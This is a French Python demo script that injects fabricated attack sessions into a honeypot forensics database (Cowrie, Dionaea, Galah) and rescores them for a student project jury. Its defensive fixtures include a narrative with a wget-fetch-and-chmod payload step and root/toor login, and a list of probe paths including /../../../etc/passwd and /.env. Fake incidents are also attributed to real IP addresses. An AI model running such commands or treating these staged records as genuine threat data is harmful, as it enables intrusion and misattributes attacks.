"""
demo_inject.py — Injection de sessions de démonstration pour le jury PFE.

3 IPs publiques à très mauvaise réputation, une par honeypot :
  - Cowrie  (SSH/Telnet) : 185.220.101.5  — Tor exit node + brute-force SSH #1 mondial
  - Dionaea (SMB/ports)  : 80.82.77.33    — Scanner Shodan/Censys, AbuseIPDB = 100
  - Galah   (HTTP)       : 45.155.205.233 — Botnet scanner HTTP, AbuseIPDB ~100

Usage (depuis l'hôte) :
  docker exec forenhive-forensic-engine python demo_inject.py
  docker exec forenhive-forensic-engine python demo_inject.py --clean
  docker exec forenhive-forensic-engine python demo_inject.py --ip-cowrie 1.2.3.4 --ip-dionaea 5.6.7.8 --ip-galah 9.10.11.12
"""

import argparse
import json
from datetime import datetime, timezone, timedelta

import db_pool

# ── IPs par défaut (connues, très mauvaise réputation) ────────────────────────
#
# Stratégie démo jury :
#   IP_A (185.220.101.5) frappe les 3 honeypots → corrélation multi-honeypot
#            → signal sophistication +2 pts → score total 80/100 = CRITIQUE
#   IP_B (80.82.77.33) frappe Dionaea seul → AbuseIPDB 100, scan SMB → FAIBLE/MOYEN
#
DEFAULT_IP_COWRIE  = "185.220.101.5"   # Tor exit relay, AbuseIPDB=100 — SSH brute-force
DEFAULT_IP_DIONAEA = "80.82.77.33"     # Shodan/Censys scanner, AbuseIPDB=100 — SMB scan
DEFAULT_IP_GALAH   = "185.220.101.5"   # Meme attaquant → multi-honeypot → score CRITIQUE

# ─────────────────────────────────────────────────────────────────────────────


def _clean(ips: list[str]) -> None:
    """Supprime les sessions de démo pour repartir propre."""
    with db_pool.pooled_conn() as conn:
        with conn.cursor() as cur:
            for ip in ips:
                cur.execute(
                    "DELETE FROM forensic_sessions WHERE source_ip = %s", (ip,)
                )
                cur.execute(
                    "DELETE FROM ip_enrichment_cache WHERE ip = %s", (ip,)
                )
        conn.commit()
    print(f"[CLEAN] Sessions et enrichissements supprimés pour : {', '.join(ips)}")


def inject_cowrie(source_ip: str) -> None:
    """SSH brute-force avec login réussi, exfiltration, multi-commandes."""
    now = datetime.now(timezone.utc)
    sessions = [
        {
            "session_id":         f"demo-cowrie-ssh-{source_ip}",
            "honeypot_type":      "cowrie",
            "source_ip":          source_ip,
            "started_at":         now - timedelta(hours=3),
            "ended_at":           now - timedelta(hours=2),
            "login_attempts":     847,
            "success_count":      1,
            "failed_count":       846,
            "command_count":      14,
            "exfil_bytes":        128540,
            "attack_velocity":    14.1,
            "destination_port":   22,
            "kill_chain_stage":   5,
            "kill_chain_phase":   "Actions on Objectives",
            "primary_technique":  "T1110.001",
            "mitre_techniques":   json.dumps([
                "T1110.001",  # Brute Force: Password Guessing
                "T1021.004",  # Remote Services: SSH
                "T1059.004",  # Command and Scripting: Unix Shell
                "T1041",      # Exfiltration Over C2 Channel
                "T1078",      # Valid Accounts
            ]),
            "enrichment_data":    json.dumps({
                "yara_matches": [],
                "vt_malicious": 0,
            }),
            "forensic_narrative": (
                f"IP {source_ip} (Tor exit relay) a effectué 847 tentatives SSH sur le honeypot Cowrie. "
                f"Login réussi avec les credentials root/toor. Post-exploitation : whoami, uname -a, "
                f"wget http://185.220.101.5/payload.sh, chmod +x, exfiltration de 128 KB. "
                f"Phase ATT&CK : Actions on Objectives (T1110.001 → T1078 → T1041)."
            ),
        },
        {
            "session_id":         f"demo-cowrie-telnet-{source_ip}",
            "honeypot_type":      "cowrie",
            "source_ip":          source_ip,
            "started_at":         now - timedelta(hours=5),
            "ended_at":           now - timedelta(hours=4, minutes=45),
            "login_attempts":     230,
            "success_count":      0,
            "failed_count":       230,
            "command_count":      0,
            "exfil_bytes":        0,
            "attack_velocity":    25.6,
            "destination_port":   23,
            "kill_chain_stage":   2,
            "kill_chain_phase":   "Initial Access",
            "primary_technique":  "T1110.001",
            "mitre_techniques":   json.dumps(["T1110.001"]),
            "enrichment_data":    json.dumps({}),
            "forensic_narrative": (
                f"Tentative Telnet depuis {source_ip} — 230 essais, aucun succès."
            ),
        },
    ]
    _upsert_sessions(sessions)
    print(f"[COWRIE ] {source_ip} — 2 sessions injectées (SSH+Telnet)")


def inject_dionaea(source_ip: str) -> None:
    """SMB scanner + probe MS17-010 (EternalBlue), port multi-services."""
    now = datetime.now(timezone.utc)
    sessions = [
        {
            "session_id":         f"demo-dionaea-smb-{source_ip}",
            "honeypot_type":      "dionaea",
            "source_ip":          source_ip,
            "started_at":         now - timedelta(hours=4),
            "ended_at":           now - timedelta(hours=3, minutes=50),
            "login_attempts":     120,
            "success_count":      0,
            "failed_count":       0,
            "command_count":      0,
            "exfil_bytes":        0,
            "attack_velocity":    2.0,
            "destination_port":   445,
            "kill_chain_stage":   2,
            "kill_chain_phase":   "Initial Access",
            "primary_technique":  "T1190",
            "mitre_techniques":   json.dumps([
                "T1190",      # Exploit Public-Facing Application
                "T1046",      # Network Service Discovery
                "T1021.002",  # Remote Services: SMB/Windows Admin Shares
            ]),
            "enrichment_data":    json.dumps({
                "yara_matches": [],
                "vt_malicious": 0,
                "smb_probe": "MS17-010",
            }),
            "forensic_narrative": (
                f"IP {source_ip} (scanner Shodan/Censys) a sondé le port SMB/445 avec 120 connexions. "
                f"Probe EternalBlue (MS17-010) détectée via Dionaea. "
                f"Tentative d'énumération de shares (NetShareEnum). "
                f"ATT&CK : T1190 (Exploit Public-Facing App) + T1046 (Discovery)."
            ),
        },
        {
            "session_id":         f"demo-dionaea-mssql-{source_ip}",
            "honeypot_type":      "dionaea",
            "source_ip":          source_ip,
            "started_at":         now - timedelta(hours=4, minutes=30),
            "ended_at":           now - timedelta(hours=4, minutes=20),
            "login_attempts":     88,
            "success_count":      0,
            "failed_count":       0,
            "command_count":      0,
            "exfil_bytes":        0,
            "attack_velocity":    8.8,
            "destination_port":   1433,
            "kill_chain_stage":   1,
            "kill_chain_phase":   "Reconnaissance",
            "primary_technique":  "T1046",
            "mitre_techniques":   json.dumps(["T1046", "T1190"]),
            "enrichment_data":    json.dumps({}),
            "forensic_narrative": (
                f"Scan MSSQL/1433 depuis {source_ip} — 88 probes de découverte."
            ),
        },
    ]
    _upsert_sessions(sessions)
    print(f"[DIONAEA] {source_ip} — 2 sessions injectées (SMB+MSSQL)")


def inject_galah(source_ip: str) -> None:
    """Scanner HTTP — path traversal, CVE probes, credential stuffing web."""
    now = datetime.now(timezone.utc)
    sessions = [
        {
            "session_id":         f"demo-galah-http-{source_ip}",
            "honeypot_type":      "galah",
            "source_ip":          source_ip,
            "started_at":         now - timedelta(hours=2),
            "ended_at":           now - timedelta(hours=1, minutes=30),
            "login_attempts":     412,
            "success_count":      0,
            "failed_count":       0,
            "command_count":      0,
            "exfil_bytes":        0,
            "attack_velocity":    22.9,
            "destination_port":   80,
            "kill_chain_stage":   2,
            "kill_chain_phase":   "Initial Access",
            "primary_technique":  "T1190",
            "mitre_techniques":   json.dumps([
                "T1190",      # Exploit Public-Facing Application
                "T1595.002",  # Active Scanning: Vulnerability Scanning
                "T1110.004",  # Credential Stuffing
                "T1083",      # File and Directory Discovery
            ]),
            "enrichment_data":    json.dumps({
                "yara_matches": [],
                "vt_malicious": 0,
                "http_paths": [
                    "/admin", "/wp-login.php", "/.env",
                    "/cgi-bin/luci", "/api/v1/pods",
                    "/phpmyadmin", "/../../../etc/passwd",
                    "/actuator/env", "/console",
                ],
            }),
            "forensic_narrative": (
                f"IP {source_ip} (botnet scanner) a effectué 412 requêtes HTTP sur Galah. "
                f"Chemins ciblés : /admin, /wp-login.php, /.env, /phpmyadmin, path traversal. "
                f"Probes CVE : Apache Log4j (/actuator/env), Spring4Shell (/console). "
                f"Credential stuffing détecté. ATT&CK : T1190 + T1595.002 + T1110.004."
            ),
        },
        {
            "session_id":         f"demo-galah-https-{source_ip}",
            "honeypot_type":      "galah",
            "source_ip":          source_ip,
            "started_at":         now - timedelta(hours=1, minutes=30),
            "ended_at":           now - timedelta(hours=1),
            "login_attempts":     195,
            "success_count":      0,
            "failed_count":       0,
            "command_count":      0,
            "exfil_bytes":        0,
            "attack_velocity":    10.8,
            "destination_port":   443,
            "kill_chain_stage":   1,
            "kill_chain_phase":   "Reconnaissance",
            "primary_technique":  "T1595.002",
            "mitre_techniques":   json.dumps(["T1595.002", "T1190"]),
            "enrichment_data":    json.dumps({}),
            "forensic_narrative": (
                f"Scan HTTPS/443 depuis {source_ip} — 195 requêtes de reconnaissance."
            ),
        },
    ]
    _upsert_sessions(sessions)
    print(f"[GALAH  ] {source_ip} — 2 sessions injectées (HTTP+HTTPS)")


def _upsert_sessions(sessions: list) -> None:
    with db_pool.pooled_conn() as conn:
        with conn.cursor() as cur:
            for s in sessions:
                cur.execute(
                    """
                    INSERT INTO forensic_sessions
                        (session_id, honeypot_type, source_ip,
                         started_at, ended_at,
                         login_attempts, success_count, attack_velocity,
                         kill_chain_stage, kill_chain_phase, primary_technique,
                         mitre_techniques, enrichment_data, forensic_narrative,
                         created_at, updated_at)
                    VALUES (%s, %s, %s, %s, %s,
                            %s, %s, %s,
                            %s, %s, %s,
                            %s::jsonb, %s::jsonb, %s,
                            NOW(), NOW())
                    ON CONFLICT (session_id) DO UPDATE SET
                        login_attempts   = EXCLUDED.login_attempts,
                        success_count    = EXCLUDED.success_count,
                        attack_velocity  = EXCLUDED.attack_velocity,
                        kill_chain_stage = EXCLUDED.kill_chain_stage,
                        enrichment_data  = EXCLUDED.enrichment_data,
                        updated_at       = NOW()
                    """,
                    (
                        s["session_id"],     s["honeypot_type"],  s["source_ip"],
                        s["started_at"],     s["ended_at"],
                        s["login_attempts"], s["success_count"],  s.get("attack_velocity", 0),
                        s["kill_chain_stage"], s["kill_chain_phase"], s["primary_technique"],
                        s["mitre_techniques"], s["enrichment_data"], s["forensic_narrative"],
                    ),
                )
        conn.commit()


def _store_unified_score(score_data: dict) -> None:
    synthetic_id = f"unified-{score_data['source_ip']}"
    with db_pool.pooled_conn() as conn:
        with conn.cursor() as cur:
            cur.execute(
                """
                INSERT INTO forensic_sessions
                    (session_id, honeypot_type, source_ip,
                     started_at, ended_at,
                     risk_score, risk_level, confidence,
                     signal_breakdown, honeypots_hit, honeypot_count,
                     sessions_count, mitre_techniques, enrichment_data,
                     kill_chain_stage, kill_chain_phase,
                     scored_at, updated_at)
                VALUES (%s, 'unified', %s,
                        NOW(), NOW(),
                        %s, %s, %s,
                        %s::jsonb, %s, %s,
                        %s, %s::jsonb, %s::jsonb,
                        0, 'unknown',
                        NOW(), NOW())
                ON CONFLICT (session_id) DO UPDATE SET
                    risk_score       = EXCLUDED.risk_score,
                    risk_level       = EXCLUDED.risk_level,
                    confidence       = EXCLUDED.confidence,
                    signal_breakdown = EXCLUDED.signal_breakdown,
                    honeypots_hit    = EXCLUDED.honeypots_hit,
                    honeypot_count   = EXCLUDED.honeypot_count,
                    sessions_count   = EXCLUDED.sessions_count,
                    scored_at        = NOW(),
                    updated_at       = NOW()
                """,
                (
                    synthetic_id,
                    score_data["source_ip"],
                    score_data["risk_score"],
                    score_data["risk_level"],
                    score_data["confidence"],
                    json.dumps(score_data.get("signal_breakdown", {})),
                    score_data.get("honeypots_hit", []),
                    score_data.get("honeypot_count", 0),
                    score_data.get("sessions_count", 0),
                    json.dumps([]),
                    json.dumps(score_data.get("enrichment_snapshot", {})),
                ),
            )
        conn.commit()


def rescore(demo_ips: list[str]) -> None:
    """
    Après enrichissement, recalcule le risk score pour chaque IP via RiskScorer
    et met à jour TOUTES les sessions individuelles + stocke la ligne unifiée.

    Corrige le bug : risk_score calculé avant enrichissement (score faux).
    """
    from risk_score_optimized import RiskScorer
    scorer = RiskScorer()

    for ip in demo_ips:
        print(f"\n[RESCORE] {ip} ...")
        result = scorer.calculate_risk_score(ip, time_window_hours=6)
        score      = result["risk_score"]
        level      = result["risk_level"]
        confidence = result["confidence"]
        breakdown  = result.get("signal_breakdown", {})

        # Mise à jour des sessions individuelles (cowrie / dionaea / galah)
        with db_pool.pooled_conn() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    """
                    UPDATE forensic_sessions
                    SET risk_score      = %s,
                        risk_level      = %s,
                        confidence      = %s,
                        signal_breakdown = %s::jsonb,
                        scored_at       = NOW(),
                        updated_at      = NOW()
                    WHERE source_ip     = %s
                      AND honeypot_type != 'unified'
                    """,
                    (score, level, confidence, json.dumps(breakdown), ip),
                )
            conn.commit()

        # Stockage de la ligne unified-{ip}
        _store_unified_score(result)
        print(f"[RESCORE] {ip} → {score}/100 {level} (confiance: {confidence})")
        sigs = result.get("signal_breakdown", {})
        for k, v in sigs.items():
            if isinstance(v, dict):
                print(f"          {k:15s}: {v.get('points',0)}/{v.get('max',0)} pts — {v.get('detail','')}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Injection démo jury ForenHive")
    parser.add_argument("--ip-cowrie",  default=DEFAULT_IP_COWRIE)
    parser.add_argument("--ip-dionaea", default=DEFAULT_IP_DIONAEA)
    parser.add_argument("--ip-galah",   default=DEFAULT_IP_GALAH)
    parser.add_argument("--clean",      action="store_true", help="Supprimer les sessions demo avant injection")
    parser.add_argument("--rescore",    action="store_true", help="Rescorer les sessions après enrichissement")
    args = parser.parse_args()

    all_ips = [args.ip_cowrie, args.ip_dionaea, args.ip_galah]

    if args.rescore:
        print("=" * 60)
        print("  ForenHive — Rescore post-enrichissement")
        print("=" * 60)
        rescore(all_ips)
        print("\n[OK] Rescore terminé — les rapports sont maintenant cohérents.")
    else:
        print("=" * 60)
        print("  ForenHive — Injection Démo Jury")
        print("=" * 60)
        print(f"  Cowrie  (SSH)  → {args.ip_cowrie}")
        print(f"  Dionaea (SMB)  → {args.ip_dionaea}")
        print(f"  Galah   (HTTP) → {args.ip_galah}")
        print("=" * 60)

        if args.clean:
            _clean(all_ips)

        inject_cowrie(args.ip_cowrie)
        inject_dionaea(args.ip_dionaea)
        inject_galah(args.ip_galah)

        print()
        print("[OK] Injection terminée. Prochaines étapes :")
        print("  1. Enrichissement  : python engine.py --enrich-only --hours 6")
        print("  2. Rescore         : python demo_inject.py --rescore")
        print("  3. Profil LLM      : python engine.py --profile-only --hours 6")
        print("  4. API backend     : curl http://localhost:8000/api/risk-score/")
        print("  5. Plateforme web  : http://172.16.1.100:3000")
